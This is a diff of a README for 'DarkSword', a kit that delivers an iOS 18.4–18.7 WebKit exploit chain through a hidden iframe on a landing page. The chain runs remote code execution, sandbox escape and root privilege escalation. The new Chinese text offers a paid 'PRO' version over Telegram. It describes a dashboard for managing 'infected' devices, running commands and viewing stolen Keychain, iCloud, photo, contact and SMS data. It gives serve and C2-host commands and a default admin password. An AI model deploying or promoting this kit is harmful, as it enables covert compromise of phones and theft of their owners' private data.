@@ -1,15 +1,52 @@
 # DarkSword Red Team Framework
 
-Framework Python com CLI para entrega da cadeia de exploits **DarkSword** em operações de red team. Baseado nos repositórios [DarkSword-RCE](https://github.com/htimesnine/DarkSword-RCE) e [darksword-kexploit](https://github.com/opa334/darksword-kexploit).
+DarkSword是一个基于iOS WebKit漏洞链的红队渗透测试框架，支持iOS 18.4 - 18.7版本的远程代码执行和权限提升。
 
-> **Aviso**: Use apenas em ambientes autorizados. Operações de red team requerem autorização formal.
+> **⚠️ 免责声明**：本工具仅用于授权的安全测试和研究目的。使用前请确保您拥有目标系统的合法授权。未经授权的使用可能违反法律法规。
 
-## Referências
+## 获取完整PRO项目
 
-- [Google Threat Intelligence - DarkSword iOS Exploit Chain](https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain)
-- Suporta iOS 18.4 - 18.7 (WebKit RCE + privilege escalation)
+如需获取完整PRO版本及技术支持，请联系Telegram：[https://t.me/Jeequan](https://t.me/Jeequan)（技术支持费用：5000U）
 
-## Instalação
+## 功能特性
+
+### 漏洞利用能力
+| 能力 | 说明 |
+|-----|------|
+| **远程代码执行** | 通过WebKit漏洞在iOS设备上执行任意JavaScript代码 |
+| **沙箱逃逸** | 突破iOS应用沙箱限制 |
+| **权限提升** | 获取root级别系统权限 |
+| **数据窃取** | 窃取iCloud数据、Keychain、照片、通讯录、短信等 |
+| **文件操作** | 访问和操作设备文件系统 |
+
+### 后台管理系统
+基于FastAPI + Vue 3构建的完整管理后台，提供：
+
+- **仪表盘**：实时统计和监控
+- **设备管理**：管理受感染的iOS设备
+- **访问日志**：记录设备访问记录
+- **命令执行**：向设备发送执行命令
+- **数据管理**：查看窃取的数据和文件
+- **用户管理**：管理员权限管理
+
+## 系统展示
+
+### 首页仪表盘
+![首页](展示/首页.png)
+
+### 设备管理
+![设备管理](展示/设备管理.png)
+
+### 访问日志
+![访问日志](展示/访问日志.png)
+
+### 数据管理
+![数据管理](展示/数据管理.png)
+
+### 命令执行
+![命令执行](展示/命令执行.png)
+
+## 安装
 
 ```bash
 git clone https://github.com/bhideki/darksword.git
@@ -17,89 +54,97 @@ cd darksword
 pip install -e .
 ```
 
-## Uso Rápido
+## 快速使用
 
+### 启动漏洞服务器
 ```bash
 darksword serve
 ```
 
-Acesse de um dispositivo iOS (Safari): `http://<SEU_IP>:8080/`
+在iOS设备上通过Safari访问：`http://<你的IP>:8080/`
 
-Payloads e kexploit ja incluidos. Para atualizar: `darksword sync` e `darksword sync-kexploit`
-
-## Comandos CLI
-
-| Comando | Descrição |
-|---------|-----------|
-| `darksword serve` | Inicia servidor HTTP para entrega dos exploits |
-| `darksword sync` | Baixa payloads do repositório DarkSword-RCE |
-| `darksword list` | Lista payloads disponíveis localmente |
-| `darksword info` | Exibe informações sobre a cadeia e CVEs |
-| `darksword template generate` | Gera landing page personalizada |
-| `darksword template list` | Lista templates disponíveis |
-| `darksword sync-kexploit` | Baixa kernel exploit (opa334, Objective-C) |
-
-### Opções do `serve`
-
-```
-darksword serve -H 0.0.0.0 -p 8080
-darksword serve -p 8443 --c2-host https://seu-c2.com/payload
+### 启动管理后台
+```bash
+cd admin
+python -m uvicorn main:app --host 0.0.0.0 --port 8000
 ```
 
-- `-H, --host`: Host (padrão: 0.0.0.0)
-- `-p, --port`: Porta (padrão: 8080)
-- `--c2-host`: C2 customizado (ex: `http://seu-ip:8080`) - sobrescreve host/porta no pe_main.js
-- `--redirect`: URL de redirecionamento em fallback
+访问后台：`http://localhost:8000`
 
-Sem `--c2-host`, o host/porta sao obtidos do Host header (mesmo servidor). Dados exfiltrados vao para `exfil/` e POST `/upload`.
+默认管理员账号：`admin` / `admin123`
 
-### Gerar landing page customizada
+## CLI命令
+
+| 命令 | 描述 |
+|-----|------|
+| `darksword serve` | 启动漏洞交付HTTP服务器 |
+| `darksword sync` | 从GitHub同步payload文件 |
+| `darksword list` | 列出本地可用的payload |
+| `darksword info` | 显示漏洞链信息和CVE详情 |
+| `darksword sync-kexploit` | 同步内核漏洞文件（Objective-C） |
+
+### serve命令选项
 
 ```bash
-darksword template generate --title "Promoção Especial" --redirect https://site-legitimo.com
+darksword serve -H 0.0.0.0 -p 8080
+darksword serve -p 8443 --c2-host https://your-c2.com/payload
 ```
 
-## Estrutura do Projeto
+- `-H, --host`: 监听地址（默认：0.0.0.0）
+- `-p, --port`: 监听端口（默认：8080）
+- `--c2-host`: 自定义C2服务器地址
+- `--redirect`: 漏洞利用后的重定向URL
+
+## 漏洞链流程
+
+1. **index.html** → 着陆页，加载frame.html到隐藏iframe
+2. **frame.html** → 注入rce_loader.js
+3. **rce_loader.js** → 根据iOS版本加载对应的RCE模块
+4. **rce_module.js / rce_module_18.6.js** → RCE利用模块
+5. **rce_worker_18.4.js / rce_worker_18.6.js** → WebWorker漏洞利用
+6. **sbx0_main_18.4.js / sbx1_main.js** → 沙箱逃逸
+7. **pe_main.js** → 权限提升（获取root权限）
+
+## 项目结构
 
 ```
 DarkSword/
-├── darksword/           # Modulo Python
-│   ├── cli.py          # CLI principal
-│   ├── server.py       # Servidor HTTP
-│   ├── payloads.py     # Sync e gestao de payloads
-│   └── config.py
-├── payloads/            # Payloads Web (apos darksword sync)
-├── templates/           # Templates de landing page
-├── kexploit/            # Kernel exploit Obj-C (apos darksword sync-kexploit)
+├── admin/                    # 管理后台
+│   ├── frontend/            # Vue 3前端
+│   ├── routers/             # FastAPI路由
+│   ├── main.py              # 后端入口
+│   ├── auth.py              # 认证模块
+│   ├── database.py          # 数据库模型
+│   └── schemas.py           # Pydantic模型
+├── darksword/               # Python核心模块
+│   ├── cli.py               # CLI入口
+│   ├── server.py            # HTTP服务器
+│   ├── payloads.py          # Payload管理
+│   └── config.py            # 配置管理
+├── payloads/                # Web漏洞payload
+├── kexploit/                # 内核漏洞文件
+├── templates/               # 着陆页模板
+├── 展示/                    # 系统截图
+├── darksword.db             # SQLite数据库
 ├── pyproject.toml
 └── README.md
 ```
 
-### Verificacao repos
+## 支持的iOS版本
 
-| Repo | Arquivos |
-|------|----------|
-| **htimesnine/DarkSword-RCE** | index.html, frame.html, rce_loader.js, rce_module*.js, rce_worker*.js, sbx*.js, pe_main.js |
-| **ghh-jb/DarkSword** | Identico (fallback) |
-| **opa334/darksword-kexploit** | Makefile, src/main.m, entitlements.plist |
-| **Nao publico** | rce_worker_18.7.js (iOS 18.7) |
+- iOS 18.4
+- iOS 18.5
+- iOS 18.6
+- iOS 18.6.1
+- iOS 18.6.2
+- iOS 18.7
 
-## Fluxo da Cadeia DarkSword
+## 参考资料
 
-1. **index.html** → Landing page carrega frame.html em iframe oculto
-2. **frame.html** → Injeta rce_loader.js
-3. **rce_loader.js** → Carrega módulos RCE conforme versão do iOS
-4. **rce_module.js / rce_module_18.6.js** → Módulos RCE
-5. **rce_worker_18.4.js / rce_worker_18.6.js** → Web Workers (exploits JSC)
-6. **sbx0_main_18.4.js / sbx1_main.js** → Sandbox escape
-7. **pe_main.js** → Privilege escalation
+- [Google Threat Intelligence - DarkSword iOS Exploit Chain](https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain)
+- [DarkSword-RCE GitHub](https://github.com/htimesnine/DarkSword-RCE)
+- [darksword-kexploit GitHub](https://github.com/opa334/darksword-kexploit)
 
-## Requisitos Éticos
+## 许可证
 
-- **Autorização**: Use apenas contra sistemas que você tem permissão explícita para testar
-- **Escopo**: Respeite os limites definidos no contrato/escopo do engajamento
-- **Documentação**: Registre todas as atividades para relatórios de red team
-
-## Licença
-
-MIT - Apenas para fins educacionais e de testes de segurança autorizados.
+MIT License - 仅用于教育和授权安全测试目的。
